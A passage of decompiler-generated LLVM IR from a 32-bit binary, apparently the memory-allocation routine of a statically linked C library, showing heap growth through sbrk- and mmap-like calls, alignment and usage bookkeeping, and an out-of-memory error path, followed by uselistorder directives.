  store i32 %v5_8051080, i32* %eax.global-to-local, align 4
  %v1_8051084 = sub i32 0, %v0_8050f54
  store i32 %v1_8051084, i32* @edx, align 4
  %v2_805108c = and i32 %v5_8051080, %v1_8051084
  store i32 %v2_805108c, i32* @esi, align 4
  %tmp91 = icmp slt i32 %v2_805108c, 1
  br i1 %tmp91, label %dec_label_pc_80510a6, label %dec_label_pc_8051090

dec_label_pc_8051090:                             ; preds = %dec_label_pc_805107c
  store i32 %v2_805108c, i32* %stack_var_-92, align 4
  %v1_8051094 = call i32 @function_80528b1(i32 %v2_805108c)
  store i32 %v1_8051094, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_8051094, i32* @ebx, align 4
  %v10_80510a1 = icmp eq i32 %v1_8051094, -1
  %v1_80510a4 = icmp eq i1 %v10_80510a1, false
  br i1 %v1_80510a4, label %dec_label_pc_80510fc.dec_label_pc_8051105_crit_edge, label %dec_label_pc_8051090.dec_label_pc_80510a6_crit_edge

dec_label_pc_8051090.dec_label_pc_80510a6_crit_edge: ; preds = %dec_label_pc_8051090
  %v0_80510a6.pre = load i8, i8* @global_var_8054940.49, align 64
  br label %dec_label_pc_80510a6

dec_label_pc_80510a6:                             ; preds = %dec_label_pc_8051090.dec_label_pc_80510a6_crit_edge, %dec_label_pc_805107c
  %v0_80510d2 = phi i32 [ -1, %dec_label_pc_8051090.dec_label_pc_80510a6_crit_edge ], [ %v1_8051084, %dec_label_pc_805107c ]
  %v0_80510a6 = phi i8 [ %v0_80510a6.pre, %dec_label_pc_8051090.dec_label_pc_80510a6_crit_edge ], [ %v0_8051071, %dec_label_pc_805107c ]
  %v1_80510a6 = urem i8 %v0_80510a6, 2
  %v2_80510a6 = icmp eq i8 %v1_80510a6, 0
  br i1 %v2_80510a6, label %dec_label_pc_80510a6.dec_label_pc_80510bb_crit_edge, label %dec_label_pc_80510af

dec_label_pc_80510a6.dec_label_pc_80510bb_crit_edge: ; preds = %dec_label_pc_80510a6
  %v0_80510bb.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80510bb

dec_label_pc_80510af:                             ; preds = %dec_label_pc_80510a6
  %v2_80510b3 = add i32 %v1_8051068, %v1_8050f88
  store i32 %v2_80510b3, i32* %eax.global-to-local, align 4
  %v0_80510b5 = load i32, i32* @esi, align 4
  %v2_80510b5 = add i32 %v0_80510b5, %v2_80510b3
  %v5_80510b7 = and i32 %v2_80510b5, %v1_8051084
  store i32 %v5_80510b7, i32* @esi, align 4
  br label %dec_label_pc_80510bb

dec_label_pc_80510bb:                             ; preds = %dec_label_pc_80510a6.dec_label_pc_80510bb_crit_edge, %dec_label_pc_80510af
  %v0_80510bb = phi i32 [ %v0_80510bb.pre, %dec_label_pc_80510a6.dec_label_pc_80510bb_crit_edge ], [ %v5_80510b7, %dec_label_pc_80510af ]
  %tmp130 = icmp ult i32 %v0_80510bb, 1048576
  br i1 %tmp130, label %dec_label_pc_80510c3, label %dec_label_pc_80510c8

dec_label_pc_80510c3:                             ; preds = %dec_label_pc_80510bb
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_80510c8

dec_label_pc_80510c8:                             ; preds = %dec_label_pc_80510bb, %dec_label_pc_80510c3
  %v0_80510dc = phi i32 [ %v0_80510bb, %dec_label_pc_80510bb ], [ 1048576, %dec_label_pc_80510c3 ]
  %tmp131 = icmp ugt i32 %v0_80510dc, %.v1_8050c13
  br i1 %tmp131, label %dec_label_pc_80510d2, label %dec_label_pc_805130a

dec_label_pc_80510d2:                             ; preds = %dec_label_pc_80510c8
  store i32 0, i32* %stack_var_-92, align 4
  %v8_80510df = call i32 @function_8052400(i32 0, i32 %v0_80510dc, i32 3, i32 34, i32 0, i32 0, i32 %v0_80510d2, i32 %v0_80510d2)
  store i32 %v8_80510df, i32* %eax.global-to-local, align 4
  store i32 %v8_80510df, i32* @ebx, align 4
  %v10_80510e9 = icmp eq i32 %v8_80510df, -1
  br i1 %v10_80510e9, label %dec_label_pc_805130a, label %dec_label_pc_80510fc.thread

dec_label_pc_80510fc.thread:                      ; preds = %dec_label_pc_80510d2
  %v0_80510f2 = load i8, i8* @global_var_8054940.49, align 1
  %v2_80510f2 = and i8 %v0_80510f2, -2
  store i8 %v2_80510f2, i8* @global_var_8054940.49, align 64
  %v1_80510f9 = load i32, i32* @esi, align 4
  %v2_80510f9 = add i32 %v1_80510f9, %v8_80510df
  store i32 %v2_80510f9, i32* @edx, align 4
  br label %dec_label_pc_8051105

dec_label_pc_80510fc.dec_label_pc_8051105_crit_edge: ; preds = %dec_label_pc_8051090
  %v1_8051109.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051105

dec_label_pc_8051105:                             ; preds = %dec_label_pc_80510fc.dec_label_pc_8051105_crit_edge, %dec_label_pc_80510fc.thread
  %v1_8051109 = phi i32 [ %v1_80510f9, %dec_label_pc_80510fc.thread ], [ %v1_8051109.pre, %dec_label_pc_80510fc.dec_label_pc_8051105_crit_edge ]
  %v0_80511d1100 = phi i32 [ %v8_80510df, %dec_label_pc_80510fc.thread ], [ %v1_8051094, %dec_label_pc_80510fc.dec_label_pc_8051105_crit_edge ]
  %v0_80511c399 = phi i32 [ %v2_80510f9, %dec_label_pc_80510fc.thread ], [ -1, %dec_label_pc_80510fc.dec_label_pc_8051105_crit_edge ]
  %v0_8051109 = load i32, i32* @global_var_8054948.46, align 8
  %v2_8051109 = add i32 %v1_8051109, %v0_8051109
  store i32 %v2_8051109, i32* @global_var_8054948.46, align 8
  %v2_805110f = add i32 %v1_8051068, %v0_8051055
  store i32 %v2_805110f, i32* %ecx.global-to-local, align 4
  %v2_8051111 = sub i32 %v0_80511d1100, %v2_805110f
  %v12_8051111 = icmp eq i32 %v2_8051111, 0
  %v10_8051115 = icmp eq i32 %v0_80511c399, -1
  %tmp132 = and i1 %v12_8051111, %v10_8051115
  br i1 %tmp132, label %dec_label_pc_805111a, label %dec_label_pc_805112c

dec_label_pc_805111a:                             ; preds = %dec_label_pc_8051105
  %v2_805111a = add i32 %v1_8051109, %v1_8051068
  store i32 %v0_8051055, i32* %ecx.global-to-local, align 4
  %v1_8051121 = or i32 %v2_805111a, 1
  store i32 %v1_8051121, i32* %eax.global-to-local, align 4
  store i32 %v1_8051121, i32* %v2_805105e, align 4
  br label %dec_label_pc_8051259

dec_label_pc_805112c:                             ; preds = %dec_label_pc_8051105
  %v7_8051111 = icmp ult i32 %v0_80511d1100, %v2_805110f
  %v0_805112c = load i8, i8* @global_var_8054940.49, align 1
  %v1_805112c = sext i8 %v0_805112c to i32
  store i32 %v1_805112c, i32* %eax.global-to-local, align 4
  %v2_8051131 = urem i8 %v0_805112c, 2
  %v3_8051131 = icmp eq i8 %v2_8051131, 0
  %brmerge = or i1 %v2_8051068, %v3_8051131
  %v1_805113b = icmp eq i1 %v7_8051111, false
  %or.cond97 = or i1 %v1_805113b, %brmerge
  br i1 %or.cond97, label %dec_label_pc_8051145, label %dec_label_pc_805113d

dec_label_pc_805113d:                             ; preds = %dec_label_pc_805112c
  %v1_805113d = and i32 %v1_805112c, -2
  %v4_805113d = trunc i32 %v1_805113d to i8
  store i32 %v1_805113d, i32* %eax.global-to-local, align 4
  store i8 %v4_805113d, i8* @global_var_8054940.49, align 64
  br label %dec_label_pc_8051145

dec_label_pc_8051145:                             ; preds = %dec_label_pc_805112c, %dec_label_pc_805113d
  %v0_8051145 = phi i8 [ %v0_805112c, %dec_label_pc_805112c ], [ %v4_805113d, %dec_label_pc_805113d ]
  %v1_8051145 = urem i8 %v0_8051145, 2
  %v2_8051145 = icmp eq i8 %v1_8051145, 0
  br i1 %v2_8051145, label %dec_label_pc_80511c3, label %dec_label_pc_805114e

dec_label_pc_805114e:                             ; preds = %dec_label_pc_8051145
  br i1 %v2_8051068, label %dec_label_pc_805115c, label %dec_label_pc_8051152

dec_label_pc_8051152:                             ; preds = %dec_label_pc_805114e
  store i32 %v2_8051111, i32* %eax.global-to-local, align 4
  %v2_8051156 = add i32 %v2_8051109, %v2_8051111
  store i32 %v2_8051156, i32* @global_var_8054948.46, align 8
  br label %dec_label_pc_805115c

dec_label_pc_805115c:                             ; preds = %dec_label_pc_805114e, %dec_label_pc_8051152
  %v1_805115e = urem i32 %v0_80511d1100, 8
  %v2_805115e = icmp eq i32 %v1_805115e, 0
  store i32 %v1_805115e, i32* %edx.global-to-local, align 4
  %v1_8051161 = icmp eq i1 %v2_805115e, false
  br i1 %v1_8051161, label %dec_label_pc_8051169, label %dec_label_pc_8051163

dec_label_pc_8051163:                             ; preds = %dec_label_pc_805115c
  store i32 %v0_80511d1100, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051173

dec_label_pc_8051169:                             ; preds = %dec_label_pc_805115c
  %v2_805116e = sub nsw i32 8, %v1_805115e
  store i32 %v2_805116e, i32* %eax.global-to-local, align 4
  %v2_8051170 = add i32 %v2_805116e, %v0_80511d1100
  store i32 %v2_8051170, i32* @edi, align 4
  br label %dec_label_pc_8051173

dec_label_pc_8051173:                             ; preds = %dec_label_pc_8051163, %dec_label_pc_8051169
  %v0_8051176 = phi i32 [ 0, %dec_label_pc_8051163 ], [ %v2_805116e, %dec_label_pc_8051169 ]
  %v2_8051173 = add i32 %v1_8051109, %v0_80511d1100
  %v2_8051176 = add i32 %v0_8051176, %v1_8051068
  store i32 %v2_8051176, i32* %ecx.global-to-local, align 4
  %v2_805117f = add i32 %v2_8051176, %v2_8051173
  store i32 %v2_805117f, i32* %edx.global-to-local, align 4
  %v2_8051185 = add i32 %v2_805117f, %v1_8050f88
  %v5_8051188 = and i32 %v2_8051185, %v1_8051084
  %v2_805118f = sub i32 %v5_8051188, %v2_805117f
  store i32 %v2_805118f, i32* %eax.global-to-local, align 4
  %v2_8051191 = add i32 %v2_805118f, %v2_8051176
  store i32 %v2_8051191, i32* @esi, align 4
  store i32 %v2_8051191, i32* %stack_var_-92, align 4
  %v1_8051195 = call i32 @function_80528b1(i32 %v2_8051191)
  store i32 %v1_8051195, i32* %eax.global-to-local, align 4
  store i32 %v1_8051195, i32* @edx, align 4
  %v10_805119f = icmp eq i32 %v1_8051195, -1
  %v1_80511a2 = icmp eq i1 %v10_805119f, false
  br i1 %v1_80511a2, label %dec_label_pc_80511b2, label %dec_label_pc_80511a4

dec_label_pc_80511a4:                             ; preds = %dec_label_pc_8051173
  store i32 0, i32* %stack_var_-92, align 4
  %v1_80511a9 = call i32 @function_80528b1(i32 0)
  store i32 %v1_80511a9, i32* %eax.global-to-local, align 4
  store i32 %v1_80511a9, i32* @edx, align 4
  br label %dec_label_pc_80511e6

dec_label_pc_80511b2:                             ; preds = %dec_label_pc_8051173
  %v1_80511b2 = load i32, i32* @ebx, align 4
  %v7_80511b2 = icmp ult i32 %v1_8051195, %v1_80511b2
  %v1_80511b4 = icmp eq i1 %v7_80511b2, false
  br i1 %v1_80511b4, label %dec_label_pc_80511eb, label %dec_label_pc_80511b6

dec_label_pc_80511b6:                             ; preds = %dec_label_pc_80511b2
  %v0_80511b6 = load i8, i8* @global_var_8054940.49, align 1
  %v2_80511b6 = and i8 %v0_80511b6, -2
  store i8 %v2_80511b6, i8* @global_var_8054940.49, align 64
  store i32 %v2_8051173, i32* @edx, align 4
  br label %dec_label_pc_80511ca

dec_label_pc_80511c3:                             ; preds = %dec_label_pc_8051145
  store i32 %v0_80511d1100, i32* @edi, align 4
  br i1 %v10_8051115, label %dec_label_pc_80511ce, label %dec_label_pc_80511ca

dec_label_pc_80511ca:                             ; preds = %dec_label_pc_80511c3, %dec_label_pc_80511b6
  %v0_80511eb58 = phi i32 [ %v2_8051173, %dec_label_pc_80511b6 ], [ %v0_80511c399, %dec_label_pc_80511c3 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80511eb

dec_label_pc_80511ce:                             ; preds = %dec_label_pc_80511c3
  store i32 0, i32* %stack_var_-92, align 4
  %v1_80511d5 = call i32 @function_80528b1(i32 0)
  store i32 %v1_80511d5, i32* @edx, align 4
  %v1_80511dc = load i32, i32* @ebx, align 4
  %v2_80511dc = sub i32 %v1_80511d5, %v1_80511dc
  %v1_80511de = load i32, i32* @esi, align 4
  %v2_80511de = sub i32 %v2_80511dc, %v1_80511de
  store i32 %v2_80511de, i32* %eax.global-to-local, align 4
  %v0_80511e0 = load i32, i32* @global_var_8054948.46, align 8
  %v2_80511e0 = add i32 %v0_80511e0, %v2_80511de
  store i32 %v2_80511e0, i32* @global_var_8054948.46, align 8
  br label %dec_label_pc_80511e6

dec_label_pc_80511e6:                             ; preds = %dec_label_pc_80511a4, %dec_label_pc_80511ce
  %v0_80511eb57 = phi i32 [ %v1_80511a9, %dec_label_pc_80511a4 ], [ %v1_80511d5, %dec_label_pc_80511ce ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80511eb

dec_label_pc_80511eb:                             ; preds = %dec_label_pc_80511b2, %dec_label_pc_80511ca, %dec_label_pc_80511e6
  %v0_80511f0 = phi i32 [ %v1_8051195, %dec_label_pc_80511b2 ], [ %v0_80511eb58, %dec_label_pc_80511ca ], [ %v0_80511eb57, %dec_label_pc_80511e6 ]
  %v10_80511eb = icmp eq i32 %v0_80511f0, -1
  br i1 %v10_80511eb, label %dec_label_pc_8051259, label %dec_label_pc_80511f0

dec_label_pc_80511f0:                             ; preds = %dec_label_pc_80511eb
  %v1_80511f0 = load i32, i32* @edi, align 4
  %v2_80511f0 = sub i32 %v0_80511f0, %v1_80511f0
  store i32 %v2_80511f0, i32* @edx, align 4
  store i32 %v1_80511f0, i32* @global_var_805460c.34, align 4
  %v1_80511f8 = load i32, i32* @esi, align 4
  %v2_80511f8 = add i32 %v1_80511f8, %v2_80511f0
  %v1_80511fb = or i32 %v2_80511f8, 1
  store i32 %v1_80511fb, i32* %eax.global-to-local, align 4
  %v2_80511fe = add i32 %v1_80511f0, 4
  %v3_80511fe = inttoptr i32 %v2_80511fe to i32*
  store i32 %v1_80511fb, i32* %v3_80511fe, align 4
  %v0_8051201 = load i32, i32* @global_var_8054948.46, align 8
  %v1_8051201 = load i32, i32* @esi, align 4
  %v2_8051201 = add i32 %v1_8051201, %v0_8051201
  store i32 %v2_8051201, i32* @global_var_8054948.46, align 8
  br i1 %v2_8051068, label %dec_label_pc_8051259, label %dec_label_pc_805120b

dec_label_pc_805120b:                             ; preds = %dec_label_pc_80511f0
  %v1_805120b = add i32 %v1_8051068, -12
  store i32 %v0_8051055, i32* %ecx.global-to-local, align 4
  %v1_8051212 = and i32 %v1_805120b, -8
  store i32 %v1_8051212, i32* %eax.global-to-local, align 4
  %v1_8051217 = or i32 %v1_8051212, 1
  store i32 %v1_8051217, i32* @edx, align 4
  %v5_805121a = icmp ult i32 %v1_8051212, 15
  store i32 %v1_8051217, i32* %v2_805105e, align 4
  %v0_8051220 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051220 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051220 = add i32 %v0_8051220, 4
  %v3_8051220 = add i32 %v2_8051220, %v1_8051220
  %v4_8051220 = inttoptr i32 %v3_8051220 to i32*
  store i32 5, i32* %v4_8051220, align 4
  %v0_8051228 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051228 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051228 = add i32 %v0_8051228, 8
  %v3_8051228 = add i32 %v2_8051228, %v1_8051228
  %v4_8051228 = inttoptr i32 %v3_8051228 to i32*
  store i32 5, i32* %v4_8051228, align 4
  br i1 %v5_805121a, label %dec_label_pc_8051259, label %dec_label_pc_8051232

dec_label_pc_8051232:                             ; preds = %dec_label_pc_805120b
  %v0_8051235 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051237 = add i32 %v0_8051235, 8
  store i32 %v1_8051237, i32* %eax.global-to-local, align 4
  %v0_805123a = load i32, i32* @global_var_8054924.50, align 4
  store i32 %v0_805123a, i32* @ebx, align 4
  store i32 %v1_8051237, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8054924.50, align 4
  %v1_805124b = call i32 @function_8051983(i32 %v1_8051237)
  store i32 %v1_805124b, i32* %eax.global-to-local, align 4
  %v0_8051250 = load i32, i32* @ebx, align 4
  store i32 %v0_8051250, i32* @global_var_8054924.50, align 4
  br label %dec_label_pc_8051259

dec_label_pc_8051259:                             ; preds = %dec_label_pc_805120b, %dec_label_pc_80511f0, %dec_label_pc_80511eb, %dec_label_pc_805111a, %dec_label_pc_8051232
  %v0_8051259 = load i32, i32* @global_var_8054948.46, align 8
  store i32 %v0_8051259, i32* %eax.global-to-local, align 4
  %v1_805125e = load i32, i32* @global_var_805494c.51, align 4
  %tmp133 = icmp ugt i32 %v0_8051259, %v1_805125e
  br i1 %tmp133, label %dec_label_pc_8051266, label %dec_label_pc_805126b

dec_label_pc_8051266:                             ; preds = %dec_label_pc_8051259
  store i32 %v0_8051259, i32* @global_var_805494c.51, align 4
  br label %dec_label_pc_805126b

dec_label_pc_805126b:                             ; preds = %dec_label_pc_8051259, %dec_label_pc_8051266
  %v1_805126b = load i32, i32* @global_var_8054944.44, align 4
  %v2_805126b = add i32 %v1_805126b, %v0_8051259
  store i32 %v2_805126b, i32* %eax.global-to-local, align 4
  %v1_8051271 = load i32, i32* @global_var_8054954.47, align 4
  %tmp134 = icmp ugt i32 %v2_805126b, %v1_8051271
  br i1 %tmp134, label %dec_label_pc_8051279, label %dec_label_pc_805127e

dec_label_pc_8051279:                             ; preds = %dec_label_pc_805126b
  store i32 %v2_805126b, i32* @global_var_8054954.47, align 4
  br label %dec_label_pc_805127e

dec_label_pc_805127e:                             ; preds = %dec_label_pc_805126b, %dec_label_pc_8051279
  %v0_805127e = load i32, i32* @global_var_805460c.34, align 4
  store i32 %v0_805127e, i32* @ebx, align 4
  %v1_8051284 = add i32 %v0_805127e, 4
  %v2_8051284 = inttoptr i32 %v1_8051284 to i32*
  %v3_8051284 = load i32, i32* %v2_8051284, align 4
  %v1_8051287 = and i32 %v3_8051284, -4
  store i32 %v1_8051287, i32* %ecx.global-to-local, align 4
  %v10_805128a = icmp ult i32 %v1_8051287, %v1_8050f27
  br i1 %v10_805128a, label %dec_label_pc_805130a, label %dec_label_pc_8051290

dec_label_pc_8051290:                             ; preds = %dec_label_pc_805127e
  store i32 %.v1_8050c13, i32* %esi.global-to-local, align 4
  %v2_8051296 = sub i32 %v1_8051287, %.v1_8050c13
  store i32 %v2_8051296, i32* %ecx.global-to-local, align 4
  %v2_8051298 = add i32 %v0_805127e, %.v1_8050c13
  store i32 %v2_8051298, i32* @edx, align 4
  %v1_805129b = or i32 %.v1_8050c13, 1
  store i32 %v1_805129b, i32* %eax.global-to-local, align 4
  store i32 %v2_8051298, i32* @global_var_805460c.34, align 4
  store i32 %v1_805129b, i32* %v2_8051284, align 4
  %v0_80512a7.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80512a7

dec_label_pc_80512a7:                             ; preds = %dec_label_pc_8050f38, %dec_label_pc_8051290
  %v0_80512a7 = phi i32 [ %v5_8050f4b, %dec_label_pc_8050f38 ], [ %v0_80512a7.pre, %dec_label_pc_8051290 ]
  %v1_80512a7 = or i32 %v0_80512a7, 1
  store i32 %v1_80512a7, i32* %ecx.global-to-local, align 4
  %v0_80512aa = load i32, i32* @ebx, align 4
  %v1_80512aa = add i32 %v0_80512aa, 8
  store i32 %v1_80512aa, i32* %ebx.global-to-local, align 4
  %v1_80512ad = load i32, i32* @edx, align 4
  %v2_80512ad = add i32 %v1_80512ad, 4
  %v3_80512ad = inttoptr i32 %v2_80512ad to i32*
  store i32 %v1_80512a7, i32* %v3_80512ad, align 4
  br label %dec_label_pc_8051317

dec_label_pc_80512b2:                             ; preds = %dec_label_pc_8050cf2
  %v5_80512b8 = sub i32 %v1_8050cd5, %.v1_8050c13
  store i32 %v5_80512b8, i32* %eax.global-to-local, align 4
  %v2_80512bc = add i32 %v1_80512c9, %.v1_8050c13
  store i32 %v2_80512bc, i32* @edx, align 4
  %v1_80512c0 = or i32 %.v1_8050c13, 1
  store i32 %v2_80512bc, i32* @global_var_8054610.35, align 16
  store i32 %v1_80512c0, i32* %v2_8050ccf, align 4
  %v0_80512cc = load i32, i32* %eax.global-to-local, align 4
  %v0_80512ce = load i32, i32* @edx, align 4
  store i32 %v0_80512ce, i32* @global_var_805461c.52, align 4
  %v1_80512d4 = or i32 %v0_80512cc, 1
  store i32 %v1_80512d4, i32* %ecx.global-to-local, align 4
  store i32 %v0_80512ce, i32* @global_var_8054620.37, align 32
  %v1_80512dd = add i32 %v0_80512ce, 8
  %v2_80512dd = inttoptr i32 %v1_80512dd to i32*
  store i32 ptrtoint (i32* @global_var_8054614.36 to i32), i32* %v2_80512dd, align 4
  %v0_80512e4 = load i32, i32* @edx, align 4
  %v1_80512e4 = add i32 %v0_80512e4, 12
  %v2_80512e4 = inttoptr i32 %v1_80512e4 to i32*
  store i32 ptrtoint (i32* @global_var_8054614.36 to i32), i32* %v2_80512e4, align 4
  %v0_80512eb = load i32, i32* %ecx.global-to-local, align 4
  %v1_80512eb = load i32, i32* @edx, align 4
  %v2_80512eb = add i32 %v1_80512eb, 4
  %v3_80512eb = inttoptr i32 %v2_80512eb to i32*
  store i32 %v0_80512eb, i32* %v3_80512eb, align 4
  %v0_80512ee = load i32, i32* %eax.global-to-local, align 4
  %v1_80512ee = load i32, i32* @edx, align 4
  %v3_80512ee = add i32 %v1_80512ee, %v0_80512ee
  %v4_80512ee = inttoptr i32 %v3_80512ee to i32*
  store i32 %v0_80512ee, i32* %v4_80512ee, align 4
  br label %dec_label_pc_80512fc

dec_label_pc_80512f3:                             ; preds = %dec_label_pc_8050d01
  store i32 %.v1_8050c13, i32* %ebx.global-to-local, align 4
  %v0_80512f7 = load i32, i32* @ebp, align 4
  %v2_80512f7 = or i32 %.v1_8050c13, 4
  %v3_80512f7 = add i32 %v0_80512f7, %v2_80512f7
  %v4_80512f7 = inttoptr i32 %v3_80512f7 to i32*
  %v5_80512f7 = load i32, i32* %v4_80512f7, align 4
  %v6_80512f7 = or i32 %v5_80512f7, 1
  store i32 %v6_80512f7, i32* %v4_80512f7, align 4
  br label %dec_label_pc_80512fc

dec_label_pc_80512fc:                             ; preds = %dec_label_pc_80512b2, %dec_label_pc_80512f3
  %v0_80512fc = load i32, i32* @ebp, align 4
  %v1_80512fc = add i32 %v0_80512fc, 8
  store i32 %v1_80512fc, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051317

dec_label_pc_8051301:                             ; preds = %dec_label_pc_8050df1
  %v1_8051301 = load i32, i32* @ebx, align 4
  %v2_8051301 = add i32 %v0_8050e00, 4
  %v3_8051301 = add i32 %v2_8051301, %v1_8051301
  %v4_8051301 = inttoptr i32 %v3_8051301 to i32*
  %v5_8051301 = load i32, i32* %v4_8051301, align 4
  %v6_8051301 = or i32 %v5_8051301, 1
  store i32 %v6_8051301, i32* %v4_8051301, align 4
  br label %dec_label_pc_8051306

dec_label_pc_8051306:                             ; preds = %dec_label_pc_8050e09, %dec_label_pc_8051301
  %v0_8051306 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8051306, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051317

dec_label_pc_805130a:                             ; preds = %dec_label_pc_80510c8, %dec_label_pc_805127e, %dec_label_pc_80510d2
  %v0_805130a = load i32, i32* %stack_var_-92, align 4
  %v1_805130a = call i32 @function_805078b(i32 %v0_805130a)
  store i32 %v1_805130a, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8051311 = inttoptr i32 %v1_805130a to i32*
  store i32 12, i32* %v1_8051311, align 4
  br label %dec_label_pc_8051317

dec_label_pc_8051317:                             ; preds = %dec_label_pc_8051306, %dec_label_pc_80512fc, %dec_label_pc_80512a7, %dec_label_pc_8050f63, %dec_label_pc_8050f15, %dec_label_pc_8050c9c, %dec_label_pc_805130a
  store i32 %v2_8050bd3, i32* @eax, align 4
  store i32 %v2_8050bd3, i32* %stack_var_-92, align 4
  %v2_8051320 = call i32 @function_80520ea(i32 %v2_8050bd3, i32 1)
  store i32 %v2_8051320, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051328

dec_label_pc_8051328:                             ; preds = %dec_label_pc_8050bf1, %dec_label_pc_8051317
  %v0_805132b = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805132b, i32* %eax.global-to-local, align 4
  %v2_805132d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805132d, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050bc0, i32* @esi, align 4
  store i32 %v0_8050bbf, i32* @edi, align 4
  store i32 %v0_8050bbe, i32* @ebp, align 4
  ret i32 %v0_805132b

; uselistorder directives
  uselistorder i32 %v0_80512ee, { 1, 0 }
  uselistorder i32 %v0_80512ce, { 1, 0, 2 }
  uselistorder i32 %v2_805126b, { 1, 0, 2 }
  uselistorder i32 %v0_8051259, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80511f0, { 1, 0 }
  uselistorder i32 %v2_80511de, { 1, 0 }
  uselistorder i32 %v1_8051195, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_805117f, { 1, 0, 2 }
  uselistorder i32 %v2_8051173, { 1, 2, 0 }
  uselistorder i32 %v2_805116e, { 1, 0, 2 }
  uselistorder i32 %v1_805115e, { 2, 1, 0 }
  uselistorder i8 %v0_805112c, { 1, 0, 2 }
  uselistorder i1 %v10_8051115, { 1, 0 }
  uselistorder i32 %v2_805110f, { 1, 0, 2 }
  uselistorder i32 %v0_80511d1100, { 3, 1, 2, 4, 0, 6, 5 }
  uselistorder i32 %v1_8051109, { 2, 1, 0 }
  uselistorder i32 %v8_80510df, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_80510dc, { 1, 0 }
  uselistorder i32 %v0_80510bb, { 1, 0 }
  uselistorder i32 %v2_805108c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8051084, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8051071, { 1, 0 }
  uselistorder i1 %v2_8051068, { 2, 1, 0 }
  uselistorder i32 %v1_8051068, { 5, 0, 1, 2, 3, 4, 6, 7 }
  uselistorder i32 %v0_8051055, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_8051039, { 1, 0, 2 }
  uselistorder i32 %v2_8051025, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8050fee, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8050fe2, { 2, 1, 0 }
  uselistorder i32 %v8_8050fd1, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_8050fb8, { 1, 0, 2 }
  uselistorder i32 %v0_8050f54, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_8050f27, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8050f1d, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_8050f0f, { 1, 0 }
  uselistorder i32 %v1_8050ea6, { 1, 0 }
  uselistorder i32 %v3_8050e9a, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_8050eaa, { 1, 0 }
  uselistorder i32 %v2_8050e94, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_8050e917, { 1, 0 }
  uselistorder i32 %v2_8050e86, { 1, 0 }
  uselistorder i32 %v1_8050e6a, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8050e66, { 2, 1, 0 }
  uselistorder i32 %v1_8050e62, { 1, 0 }
  uselistorder i32 %v1_8050e56, { 2, 1, 0 }
  uselistorder i32 %v2_8050e4c, { 1, 0 }
  uselistorder i32 %v1_8050e49, { 1, 2, 0 }
  uselistorder i32 %v4_8050de7, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_8050e32, { 1, 0 }
  uselistorder i32 %v0_8050e00, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8050dd3, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8050da0, { 0, 2, 1 }
  uselistorder i32 %v2_8050d84, { 1, 0 }
  uselistorder i32 %v1_8050d7a, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_8050d75.lcssa, { 1, 0 }
  uselistorder i32 %v3_8050d65, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_8050d5c, { 1, 0, 2 }
  uselistorder i32 %v2_8050d38, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8050d20, { 2, 1, 0 }
  uselistorder i32 %v0_8050d0c, { 2, 0, 3, 1 }
  uselistorder i32 %v3_8050cd2, { 1, 0, 2 }
  uselistorder i32 %v1_80512c9, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8050da09, { 1, 0, 2 }
  uselistorder i32 %v3_8050c7f, { 1, 0, 2 }
  uselistorder i32 %v2_8050c71, { 2, 1, 0 }
  uselistorder i1 %v6_8050c6b, { 1, 0, 2 }
  uselistorder i32 %v2_8050c4c, { 2, 1, 0 }
  uselistorder i8 %v0_8050c1a, { 3, 1, 2, 0, 4 }
  uselistorder i32 %.v1_8050c13, { 30, 12, 31, 2, 14, 32, 3, 21, 22, 33, 34, 4, 19, 20, 23, 25, 24, 5, 18, 17, 6, 16, 15, 28, 7, 27, 26, 35, 13, 29, 0, 11, 9, 10, 1, 8 }
  uselistorder i32 %v1_8050c03, { 0, 2, 1 }
  uselistorder i32 %v0_8050bec, { 1, 0 }
  uselistorder i32 %v2_8050bd3, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
